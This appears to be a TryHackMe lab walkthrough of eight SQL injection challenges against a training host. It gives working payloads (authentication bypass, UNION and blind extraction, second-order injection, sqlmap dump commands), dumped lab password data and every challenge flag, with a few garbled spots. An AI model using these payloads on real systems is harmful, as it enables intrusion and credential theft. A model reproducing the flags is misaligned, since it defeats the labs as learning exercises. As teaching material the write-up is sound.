# Technical Documentation: TryHackMe — SQL Injection Lab Walkthrough
## SQL Injection Lab (Module 1)
Executive Summary
This document details the exploitation methodologies, parameters, and flags retrieved during the completion of Module 1: In-Band (Classic) SQL Injection on TryHackMe.

Exploitation Breakdown
Lab 1: Input Box Non-String (```/sesqli1/home```)
- Vulnerability Analysis: The application accepts integer input for the ```profileID``` parameter without sanitization or string wrapping inside the SQL query.
- Executed Query:
```sql
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID=1 or 1=1--
```
(Captured from)
- Exploit Payload: ```1 or 1=1--```
- Retrieved Flag: ```THM{dccea429d73d4a6b4f117ac64724f460}```

Lab 2: Input Box String (```/sesqli2/login```)
- Vulnerability Analysis: User input is embedded within single quotes inside the SQL query. Injecting a single quote breaks the string context, enabling boolean manipulation and query truncation via comments.
- Executed Query:
```sql
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID = '1' or 1=1--' AND password='a'
```
(Captured from)
- Exploit Payload: ```1' or 1=1--```
- Retrieved Flag: ```THM{356e9de6016b9ac34e02df99a5f755ba}```

Lab 3: URL Injection (```/sesqli3/login```)
- Vulnerability Analysis: Parameters supplied directly via URL query strings are concatenated into the SQL statement without proper escaping or prepared statements.
- Executed Query:
```sql
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID='1' or 1=1--' AND password='a'
```
(Captured from)
- Exploit Payload (URL):
```plaintext
http://10.48.174.24:5000/sesqli3/login?profileID=1' or 1=1--&password=a
```
(Captured from)
- Retrieved Flag: ```THM{645eab5d34f81981f5705de54e8a9c36}```

Lab 4: POST Request Body Injection (```/sesqli4/login```)
- Vulnerability Analysis: Parameters transmitted in the HTTP POST body (```application/x-www-form-urlencoded```) are vulnerable to injection. Intercepting and modifying the POST body bypasses client-side controls.
- Executed Query:
```sql
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID = '1'or 1=1--' AND password='a'
```
(Captured from)
- Intercepted HTTP POST Body:
```HTTP
POST /sesqli4/login HTTP/1.1
Host: 10.48.174.24:5000
Content-Type: application/x-www-form-urlencoded

profileID=1'or 1=1--&password=a
```
(Captured from)
- Retrieved Flag: ```THM{727334fd0f0ea1b836a8d443f09dc8eb}```

Summary Table: Module 1 Answers
| Challenge Name                         | Injection Point,Payload           | Flag                                   |
|:--                                     |:--                                |:--                                     |
| SQL Injection 1: Input Box Non-String  | Form Input (Integer),1 or 1=1--   | THM{dccea429d73d4a6b4f117ac64724f460}  |
| SQL Injection 2: Input Box String      | Form Input (String),1' or 1=1--   | THM{356e9de6016b9ac34e02df99a5f755ba}  | 
| SQL Injection 3: URL Injection         | URL GET Parameter,1' or 1=1--     | THM{645eab5d34f81981f5705de54e8a9c36}  |
| SQL Injection 4: POST Injection        | HTTP POST Body,1'or 1=1--         | THM{727334fd0f0ea1b836a8d443f09dc8eb}  | 

## SQL Injection Lab (Module 2)
Executive Summary
This document details the complete enumeration, exploitation methodology, subquery construction, and flag retrieval for Task 3: Introduction to SQL Injection: Part 2 (SQL Injection 5: UPDATE Statement) on TryHackMe.

Target & Vulnerability Overview
- Target URL: ```[http://10.48.174.24:5000/sesqli5/](http://10.48.174.24:5000/sesqli5/)```
- Initial Credentials: ```profileID: 10``` | ```password: toor```
- Vulnerability Class: In-Band SQL Injection in HTTP POST parameters processed within an ```UPDATE``` statement.
- Impact: Overwriting arbitrary user records (e.g., password resets), enumerating metadata tables, schema exfiltration, and out-of-table data extraction.

Exploitation & Enumeration Methodology
1. Input Sanitization Bypass & Syntax Verification
Inspecting the profile modification endpoint (```/sesqli5/profile```) reveals three input fields: ```nickName```, ```email```, and ```password```. Injecting a comma-separated column reassignment breaks out of the expected input logic:
- Payload
```plaintext
asd',nickName='test',email='hacked
```
- Back-end Query Executed:
```sql
UPDATE usertable SET nickName='test',email='hackeasd',nickName='test',email='hackedd' WHERE UID='1'
```
(Result: Both fields update dynamically, confirming SQL injection in the UPDATE statement context.)

2. Environment & Version Fingerprinting
To determine the back-end database, system functions were evaluated inside subqueries:
- Payload:
```sql
',nickName=sqlite_version(),email='
```
- Result: ```3.27.2```
- DBMS Identified: SQLite

3. Database Schema Enumeration
Table Enumeration:
- Payload:
```sql
',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT like 'sqlite_%'),email='
```
- Extracted Tables: usertable, secrets
Schema Extraction (usertable):
- Payload:
```sql
',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable'),email='
```
- Structure:
```sql
CREATE TABLE usertable (
    UID integer primary key, 
    name varchar(30) NOT NULL, 
    profileID varchar(20) DEFAULT NULL, 
    salary int(9) DEFAULT NULL, 
    passportNr varchar(20) DEFAULT NULL, 
    email varchar(300) DEFAULT NULL, 
    nickName varchar(300) DEFAULT NULL, 
    password varchar(300) DEFAULT NULL
)
```
Schema Extraction (secrets):
- Payload:
```sql
CREATE TABLE secrets (
    id integer primary key, 
    author integer not null, 
    secret text not null
)
```
4. Data Exfiltration (usertable) & Password Modification
Exfiltrating Credentials:
- Payload:
```sql
',nickName=(SELECT group_concat(profileID || "." || name || "." || password) FROM usertable),email='
```
- Dumping Results:
  - ```10,Francois,ce5ca673d13b36118d54a7cf13aeb0ca012383bf771e713421b4d1fd841f539a```
  - ```11,Michandre,05842ffb6dc90bef3543dd85ee50dd302f3d1f163de1a76eee073ee97d851937```
  - ```12,Colett,c69d171e761fe56711e908515def631856c665dc234a0aa404b32c73bdbc81ac```
  - ```13,Phillip,b6efdfb0e20a34908c092725db15ae0c3666b3cea558fa74e0667bd91a10a0d3```
  - ```14,Ivan,be042a70c99d1c438cdbd479b955e4fba33faf4f8c494239257e4248bbcf4ff```
  - ```99,Admin,6ef110b045cbaa212258f7e5f08ed22216147594464427585871bfab9753ba25```

Privilege Escalation / Password Overwrite Payload:
- SHA-256 Hash Generation: ```Password123``` -> ```088c70392e3abfbd0fa47bbc2ed96aa99bd49e159727fcba0f2e6abeb3a9d601```
- Payload:
```sql
',password='088c70392e3abfbd0fa47bbc2ed96aa99bd49e159727fcba0f2e6abeb3a9d601' WHERE name='Admin'--
```
5. Out-of-Table Data Exfiltration (secrets) & Flag Capture
- Payload:
```sql
',nickName=(SELECT group_concat(id || "," || author || "," || secret) FROM secrets),email='
```
- Back-end Query Executed:
```sql
UPDATE usertable SET nickName='',email='',nickName=(SELECT group_concat(id || "," || author || "," || secret) FROM secrets),email='' WHERE UID='1'
```
- Exfiltrated String:
```1,1,Lorem ipsum... | 2,3,Donec viverra... | 3,1,Aliquam vestibulum... |```
```4,5,Etiam feugiat... | 5,6,THM{b3a540515dbd9847c29cffa1bef1edfb}```

Summary Table: Module 2 Findings
| Parameter / Entity    | Target / Value                            |
|:--                    |:--                                        |
| Vulnerable Function   | HTTP POST Edit Profile (/sesqli5/profile) | 
| DBMS Engine           | SQLite 3.27.2                             | 
| Enumerated Tables     | "usertable, secrets"                      | 
| Target Field          | secrets.secret                            | 
| Module 2 Flag         | THM{b3a540515dbd9847c29cffa1bef1edfb}     |

## SQL Injection Lab (Module 3)
Executive Summary
This document details the exploitation methodology for Task 4: Vulnerable Startup: Broken Authentication (Challenge 1) on TryHackMe. The vulnerability involves an In-Band SQL Injection in the login POST parameter, allowing complete authentication bypass to log in as an arbitrary user and retrieve the system flag.

Target & Vulnerability Overview
- Target URL: [http://10.48.174.24:5000/challenge1/login](http://10.48.174.24:5000/challenge1/login)
- Vulnerability Class: SQL Injection (Authentication Bypass)
- Vulnerable Parameter: username (HTTP POST)
- Impact: Complete authorization bypass, enabling access to privileged accounts without knowing the password.

Step-by-Step Exploitation Methodology
1. Application Inspection & Form Interception
    - Navigated to the challenge login interface at [http://10.48.174.24:5000/challenge1/login](http://10.48.174.24:5000/challenge1/login).
    - Attempted a baseline login using dummy credentials (admin / pass) and captured the HTTP request via Burp Suite.
    - HTTP POST Body:
```http
username=admin&password=pass
```
2. SQL Injection Payload Construction
- The backend constructs a ```SELECT``` query to validate credentials:
```sql
SELECT id, username FROM users WHERE username = 'USER_INPUT' AND password = 'PASSWORD_INPUT'
```
- To force the evaluation logic to return TRUE and comment out the password check, an inline comment payload was injected into the username field:
- Injected Payload:
```sql
admin' or 1=1--
```
- Modified Request Line (Burp Suite Proxy):
```http
username=admin'+or+1=1--+&password=pass
```
3. Execution & Flag Retrieval
- Submitting the payload altered the backend query structure to evaluate as always true:
```sql
SELECT id, username FROM users WHERE username = 'admin' or 1=1-- ' AND password = 'pass'
```
- The backend executed query returned a valid session, redirecting to ```/challenge1/home```.
- The authenticated session revealed the challenge message containing the target flag.

Summary Table: Module 3 Details
| Parameter / Entity    | Target / Value                                                                          |
|:--                    |:--                                                                                      |
| Target Endpoint       | [http://10.48.174.24:5000/challenge1/login](http://10.48.174.24:5000/challenge1/login)  |
| Vulnerable Parameter  | username                                                                                |
| Injection Payload     | admin' or 1=1--                                                                         |
| Captured Flag         | THM{f35f47dcd9d596f0d3860d14cd4c68ec}                                                   |

## SQL Injection Lab (Module 4)
Executive Summary
This document details the complete technical walkthrough for Task 5: Vulnerable Startup: Broken Authentication 2 (Challenge 2) on TryHackMe. The vulnerability expands on simple authentication bypass by leveraging a UNION-based SQL Injection to exfiltrate table contents (passwords) without relying on blind injection.

Target & Vulnerability Overview
- Target URL: ```[http://10.48.174.24:5000/challenge2/login](http://10.48.174.24:5000/challenge2/login)```
- Vulnerability Class: UNION-Based In-Band SQL Injection
- Vulnerable Parameter: ```username``` (HTTP POST)
- Objective: Dump all password entries from the users table to locate and retrieve the hidden challenge flag.

Step-by-Step Exploitation Methodology
1. Application Reflection & Injection Surface Mapping
The baseline query executed by the login endpoint extracts two specific columns:
```sql
SELECT id, username FROM users WHERE username = 'USER_INPUT' AND password = 'PASSWORD_INPUT'
```
- Reflection Point 1: The ```username``` result from the SQL query reflects directly in the upper-right UI banner (```Logged in as <USERNAME>```).
- Reflection Point 2: Decoded Flask session cookies (```challenge2_username```) store and reflect query output.

2. Column Structure & Data Type Enumeration
To execute a successful ```UNION``` attack, the injected query must match the column count and compatible data types of the original query:
- Testing Column Balance:
```sql
' UNION SELECT NULL-- -
' UNION SELECT NULL, NULL-- -
```
- Injecting Valid Column Structure:
```sql
' UNION SELECT 1, 2-- -
```
(Result: Successful login displaying Logged in as 2 in the top right corner, establishing that column 2 reflects string output.)

3. In-Band Schema Exfiltration & Aggregation Payload
To extract all user password rows in a single output string, the SQLite aggregate function ```group_concat()``` was applied to column 2:
- Injected Username Field:
```sql
' union select 1,group_concat(password) from users--
```
- Executed Query on Server:
```sql
SELECT id, username FROM users WHERE username = '' union select 1,group_concat(password) from users-- ' AND password = 'pass'
```
4. Execution & Flag Extraction
Submitting the group_concat payload aggregated all stored user passwords into the reflection banner:
- Exfiltrated Password String:
```plaintext
rcLYWHCXeGUsA9tH3GNV,asd,Summer2019!,345m3io4hj3,THM{fb381dfee71ef9c31b93625ad540c9fa},viking123
```
Summary Table: Module 4 Details
| Parameter / Entity         | Target / Value                                                                          |
|:--                         |:--                                                                                      |
| Target Endpoint            | [http://10.48.174.24:5000/challenge2/login](http://10.48.174.24:5000/challenge2/login)  |
| Vulnerable Field           | username                                                                                |
| Exploit Type               | UNION-Based In-Band SQL Injection                                                       |
| Final Injection Payload    | "' union select 1,group_concat(password) from users-- "                                 |
| Captured Flag              | THM{fb381dfee71ef9c31b93625ad540c9fa}                                                   |

## SQL Injection Lab (Module 5)
Executive Summary
This document outlines the exploitation methodology for Task 6: Vulnerable Startup: Broken Authentication 3 on TryHackMe. Unlike previous challenges where query outputs were directly reflected in the interface or session cookies, this challenge requires a Boolean-based Blind SQL Injection attack vector to enumerate data character-by-character based on application response behavior.

Target & Vulnerability Overview
- Target URL: ```[http://10.48.174.24:5000/challenge3/login](http://10.48.174.24:5000/challenge3/login)```
- Vulnerability Class: Boolean-Based Blind SQL Injection
- Vulnerable Parameter: ```username``` (HTTP POST)
- Objective: Extract the admin password byte-by-byte using conditional logic or automated tools to recover the challenge flag.

Step-by-Step Exploitation Methodology
1. Response Behavior Analysis
    - Application feedback differs depending on the truth value of the injected condition:
        - True Condition: Server returns an HTTP ```302 Found``` redirect to ```/challenge3/home```.
        - False Condition: Server stays on /challenge3/login displaying "```Invalid username or password```".

2. Injected Boolean Logic & Substring Construction
- SQLite's ```SUBSTR()``` function isolates target characters from the database entry:
```sql
SUBSTR((SELECT password FROM users LIMIT 0,1), 1, 1)
```
- To prevent case sensitivity conflicts from lowercased inputs, hexadecimal casting with SQLite's ```CAST()``` function converts target comparison characters:
```sql
CAST(X'54' AS Text)
```
- Constructed Injected Query (Manual Structure):
```sql
admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' AS Text)-- -
```
- Executed Server-Side SQL:
```sql
SELECT id, username FROM users WHERE username = 'admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' AS Text)
```
3. Automated Exploitation via ```sqlmap```
Due to the overhead of manual character enumeration, ```sqlmap``` was deployed to automate the Boolean-based blind extraction.
- Executed Terminal Command:
```bash
sqlmap -u "http://10.48.174.24:5000/challenge3/login" \
  --data="username=admin&password=admin" \
  --level=5 --risk=3 \
  --dbms=sqlite --technique=B --dump
```
- Execution Log Findings:
    - Identified POST parameter username as vulnerable to ```OR boolean-based blind - WHERE or HAVING clause```.
    - Dumped the ```users``` table schema and full row entries.

Summary Table: Module 5 Details

| Parameter / Entity       | Target / Value                                                                         |
|:--                       |:--                                                                                     |
| Target Endpoint          | [http://10.48.174.24:5000/challenge3/login](http://10.48.174.24:5000/challenge3/login) |
| Vulnerable Parameter     | username                                                                               |                                                           
| Exploit Technique        | Boolean-Based Blind SQL Injection                                                      |
| Automation Tool Command  | sqlmap -u "[http://10.48.174.24:5000/challenge3/login](http://10.48.174.24:5000/challenge3/login)" --data="username=admin&password=admin" --level=5 --risk=3 --dbms=sqlite --technique=B --dump                                                                         |
| Captured Flag            | THM{f1f4e0757a09a0b87eeb2f33bca6a5cb}                                                  |   

## SQL Injection Lab (Module 6)
Executive Summary
This document outlines the end-to-end vulnerability analysis and exploitation methodology for Task 7: Vulnerable Notes on TryHackMe. The challenge targets a Second-Order (Stored) SQL Injection vulnerability. Input sanitization and parameterized queries prevent direct injection during registration, but stored data is unsafely concatenated into a dynamic SQL query when user notes are retrieved, allowing complete database exfiltration.

Target & Vulnerability Overview
- Target Application: Vulnerable Notes ```([http://10.48.174.24:5000/challenge4/](http://10.48.174.24:5000/challenge4/))```
- Target Endpoints: ```/signup```, ```/login```, ```/notes```
- Vulnerability Class: Second-Order UNION-Based SQL Injection
- Vulnerable Context: username parameter stored at registration and dynamically executed on the ```/notes``` page.
- Objective: Exploit delayed SQL execution to extract user password records and recover the challenge flag.

Vulnerability Mechanism Analysis
1. Safe Ingestion Stage (```/signup & /login```)
During account creation and login, the application processes inputs using parameterized SQL queries with placeholders (```?```). The database treats malicious strings as literal text:
- Registration Query:
```sql
SELECT username FROM users WHERE username = ?
INSERT INTO users (username, password) VALUES (?, ?)
```
- Authentication Query:
```sql
SELECT id, username FROM users WHERE username = ? AND password = ?
```
2. Unsafe Execution Stage (```/notes```)
When an authenticated user visits ```/notes```, the application attempts to fetch all user-owned notes by directly concatenating the active ```username``` session variable into a raw SQL query string:
```sql
SELECT title, note FROM notes WHERE username = '' + username + ''
```
Because the stored ```username``` string contains unescaped single quotes and SQL operators, the secondary query breaks out of its string literal and executes injected payload logic.
Step-by-Step Exploitation Walkthrough

Step 1: Application Reconnaissance & Input Storage
Navigate to ```[http://10.48.174.24:5000/challenge4/signup](http://10.48.174.24:5000/challenge4/signup)``` and register a new account using a target SQL payload in the ```username``` field.
- Registration Payload (username):
```sql
' union select 1,group_concat(password) from users'
```
- Password Field: a (or any arbitrary string)

Step 2: Authentication
Navigate to ```[http://10.48.174.24:5000/challenge4/login](http://10.48.174.24:5000/challenge4/login)``` and log in using the newly created credentials:
- Username: ' union select 1,group_concat(password) from users'
- Password: a
The application authenticates the account via parameterized lookups without triggering syntax errors.

Step 3: Triggering Second-Order Execution & Exfiltration

Navigate to ```[http://10.48.174.24:5000/challenge4/notes](http://10.48.174.24:5000/challenge4/notes)```. Upon loading, the application triggers the unsafe concatenation query:
- Executed Server-Side Query:
```sql
SELECT title, note FROM notes WHERE username = '' union select 1,group_concat(password) from users''
```
- Query Behavior:
    1. Primary query (```WHERE username = ''```) evaluates to empty.
    2. ```UNION SELECT``` executes column 1 (```1```) into the note title position and column 2 (```group_concat(password)```) into the note body position.
- Exfiltrated Database Output:
```plaintext
rcLYWHCXeGUsA9tH3GNV,asd,Summer2019!,345m3io4hj3,THM{4644c7e157fd5498e7e4026c89650814},viking123,a
```
Automated Exploitation Framework (```sqlmap``` & Tamper Script)Because second-order attacks require multi-step state management (Register $\rightarrow$ Login $\rightarrow$ Fetch), automated extraction requires a custom sqlmap tamper script (so-tamper.py).
- Tamper Workflow (so-tamper.py):
    - create_account(payload): Registers a temporary user on /signup with the sqlmap payload as the username.login(payload): Authenticates to /login to acquire the target session cookie (session=...).
    - tamper(payload, **kwargs): Updates request headers with the session cookie prior to probing /notes.
- Automated sqlmap Command:
```bash
sqlmap --tamper tamper/so-tamper.py \
  --url "http://10.48.174.24:5000/challenge4/signup" \
  --data="username=admin&password=asd" \
  --second-url "http://10.48.174.24:5000/challenge4/notes" \
  -p username --dbms=sqlite --technique=U --no-cast -T users --dump
```
Module Summary Table
| Parameter / Metric              | Target Value / Result                                                         |
|:--                              |:--                                                                            |
| Challenge Module                | Task 7 / Challenge 4 (Vulnerable Notes)                                       |
| Vulnerable Target URL           | [http://10.48.174.24:5000/challenge4/](http://10.48.174.24:5000/challenge4/)  | 
| Vulnerability Class             | Second-Order (Stored) UNION-based SQL Injection                               | 
| Vulnerable Injection Parameter  | "username (Stored via /signup, executed via /notes)"                          |
| Exfiltration Payload            | "' union select 1,group_concat(password) from users'"                         | 
| Captured Flag                   | THM{4644c7e157fd5498e7e4026c89650814}                                         |

## SQL Injection Lab (Module 7)
Executive Summary
This document outlines the security analysis and step-by-step exploitation for Task 8: Vulnerable Startup: Change Password (Challenge 5) on TryHackMe. The application suffers from a secondary/stored SQL injection in its password reset logic. While user input for the new password is properly parameterized, the application unsafely concatenates the stored ```username``` parameter into an ```UPDATE``` query when a user changes their password, allowing an attacker to overwrite another user's (specifically ```admin```) password without authorization.

Target & Vulnerability Overview
- Target Application: Change Password ```([http://10.48.174.24:5000/challenge5/](http://10.48.174.24:5000/challenge5/))```
- Target Endpoints: ```/signup```, ```/login```, ```/changepwd```, ```/home```
- Vulnerability Class: Stored SQL Injection (Second-Order SQL Injection in ```UPDATE``` Query)
- Vulnerable Parameter: ```username``` (Stored at ```/signup```, dynamically concatenated at ```/changepwd```)
- Objective: Exploit the vulnerable ```UPDATE``` query to reset the administrator's password, log in as ```admin```, and capture the final challenge flag.

Vulnerability Mechanism Analysis
1. Incorrect Assumption of Data Safety
The application backend uses parameterized queries for inputs received directly from the browser during the password reset form submission. However, the developer assumed that the ```username``` field—retrieved internally from the database based on the active session ```user_id```—was safe from injection and concatenated it directly into the SQL string.
2. Intended vs. Vulnerable Query Logic
- Developer's Intended Query Structure:
```sql
UPDATE users SET password = ? WHERE username = '' + username + ''
```
- Vulnerable Concatenation Flow:
When a user registers with the username ```admin'-- -```, the database safely stores literal ```admin'-- -``` via parameterization. When this user triggers the ```/changepwd``` route, the application builds the update query dynamically:
```sql
UPDATE users SET password = ? WHERE username = 'admin'-- -'
```
The single quote breaks out of the string literal, and the SQL comment ```-- -``` truncates the trailing quote. Consequently, the query updates the ```password``` field for the actual ```admin``` user instead of the session owner.

Step-by-Step Exploitation Walkthrough
Step 1: Account Creation with Malicious Payload
Navigate to ```[http://10.48.174.24:5000/challenge5/signup](http://10.48.174.24:5000/challenge5/signup)``` and register a new account with the SQL payload embedded in the username field.
- Registration Fields:
    - Username: ```admin'-- -```
    - Password: ```aaa``` (or any arbitrary temporary password)

Step 2: Authenticate as the Malicious User
Navigate to ```[http://10.48.174.24:5000/challenge5/login](http://10.48.174.24:5000/challenge5/login)``` and authenticate into the newly created account.
- Login Credentials:
    - Username: ```admin'-- -```
    - Password: ```aaa```

Step 3: Trigger Password Overwrite via ```/changepwd```
Navigate to ```[http://10.48.174.24:5000/challenge5/changepwd](http://10.48.174.24:5000/challenge5/changepwd)``` and submit the password update form to overwrite the ```admin``` password.
- Password Change Fields:
    - Current Password: ```aaa```
    - New Password: ```123```
    - Confirm New Password: ```123```
- Executed Server-Side SQL Statement:
```sql
UPDATE users SET password = ? WHERE username = 'admin'-- -'
```
- Result: The database updates the password of the record ```WHERE username = 'admin'```, setting the administrator's password to ```123```.

Step 4: Authenticate as Administrator & Retrieve Flag
1. Log out of the current session or return to ```[http://10.48.174.24:5000/challenge5/login](http://10.48.174.24:5000/challenge5/login)```.
2. Authenticate using the administrator credentials:
    - Username: ```admin```
    - Password: ```123```
3. Upon successful login, navigate to ```/home``` to read the administrator dashboard message.

Summary Table: Module 7 Details
| Parameter / Entity         | Target / Value                                                                |
|:--                         |:--                                                                            |
| Target Endpoint            | [http://10.48.174.24:5000/challenge5/](http://10.48.174.24:5000/challenge5/)  |
| Vulnerable Function        | Password Change Logic (/changepwd)                                            |
| Vulnerability Type         | Stored / Second-Order SQL Injection in UPDATE Query                           | 
| Registration Payload       | admin'-- -                                                                    |
| Target Password Reset      | Overwrote admin password to 123                                               | 
| Captured Flag              | THM{cd5c4f197d708fda06979f13d8081013}                                         |

## SQL Injection Lab (Module 8)
Executive Summary
This document outlines the vulnerability analysis, payload development, and full exploitation methodology for Task 9: Vulnerable Startup: Book Title (Challenge 6) on TryHackMe. The target application features a book search function vulnerable to UNION-Based SQL Injection nested inside a subquery. By breaking out of the subquery context using '), an attacker can concatenate arbitrary database queries to exfiltrate table records—including user password fields—to recover the challenge flag.

Target & Vulnerability Overview
- Target Application: Book Title Search ```([http://10.48.174.24:5000/challenge6/](http://10.48.174.24:5000/challenge6/))```
- Target Endpoint: ```/challenge6/book```
- Vulnerable Parameter: ```title``` (GET request)
- Vulnerability Class: UNION-Based SQL Injection (Nested Subquery Breakout)
- Objective: Break out of the subquery structure, enumerate column counts, and retrieve the database records stored in the ```users``` table to obtain the flag.

Vulnerability Mechanism Analysis
1. Subquery Concatenation Vulnerability
When searching for a book via the ```title``` parameter, the application executes a subquery containing an unsafe string concatenation wrapped in a SQL ```LIKE``` operator:
```sql
SELECT * FROM books WHERE id = (SELECT id FROM books WHERE title LIKE '' + title + '%')
```
2. Subquery Breakout Logic
Because input is concatenated directly without sanitization:
    1. Input starts inside the string literal ```'%``` after ```title LIKE '```.
    2. Appending ```')``` terminates both the single-quoted string and the enclosing subquery parenthesis ```(SELECT id FROM books WHERE title LIKE '...')```.
    3. Injecting a ```UNION SELECT``` statement allows full control over the structural results rendered on the page.

Step-by-Step Exploitation Walkthrough
Step 1: Application Setup & Authentication
1. Navigate to ```[http://10.48.174.24:5000/challenge6/signup](http://10.48.174.24:5000/challenge6/signup)``` and register a standard user (e.g., ```test / 123```).
2. Authenticate at ```/login``` and access the user dashboard (```/home```), which displays the message: "Testing a new function to search for books, check it out here".

Step 2: Subquery Breakout & Boolean Verification
Navigate to the vulnerable search function at ```[http://10.48.174.24:5000/challenge6/book?title=test](http://10.48.174.24:5000/challenge6/book?title=test)```.
Test the subquery breakout with a boolean payload:
- Payload: ```') or 1=1 -- -```
- Executed Server-Side Query:
```sql
SELECT * FROM books WHERE id = (SELECT id FROM books WHERE title LIKE '') OR 1=1 -- -%')
```
- Result: The application returns all book records in the database, confirming full query manipulation.

Step 3: Column Enumeration
Inject a ```UNION SELECT``` payload to identify the required number of columns and reflection positions:
- Payload: ```') Union select 1,2,3,4-- -```
- Executed Query:
```sql
SELECT * FROM books WHERE id = (SELECT id FROM books WHERE title LIKE '') UNION SELECT 1,2,3,4-- -%')
```
- Rendered Reflection Positions:
    - Title: 2
    - Description: 3
    - Author: 4

Step 4: Database Exfiltration & Flag Capture
Map the 4th output column (```Author```) to aggregate all password entries from the ```users``` table via ```group_concat()```:
- Payload: ```') Union select 1,2,3,group_concat(password) from users-- -```
- Full Request URL:
```plaintext
http://10.48.174.24:5000/challenge6/book?title=')+Union+select+1,2,3,group_concat(password)+from+users--+-
```
- Exfiltrated Output (Author position):
```plaintext
Author: THM{27f8f7ce3c05ca8d6553bc5948a89210},asd,Summer2019!,345m3io4hj3,viking123,123
```
Summary Table: Module 8 Details
| Parameter / Metric       | Target Value / Result                                                                 |
|:--                       |:--                                                                                    |
| challenge Module         | Task 9 / Challenge 6 (Book Title)                                                     | 
| Vulnerable URL           | [http://10.48.174.24:5000/challenge6/book](http://10.48.174.24:5000/challenge6/book)  | 
| Vulnerability Class      | UNION-Based SQL Injection inside Subquery                                             | 
| Vulnerable Parameter     | title (GET)                                                                           |
| Breakout Sequence        | ')                                                                                    | 
| Exfiltration Payload     | "') Union select 1,2,3,group_concat(password) from users-- -"                         |
| Captured Flag            | THM{27f8f7ce3c05ca8d6553bc5948a89210}                                                 |
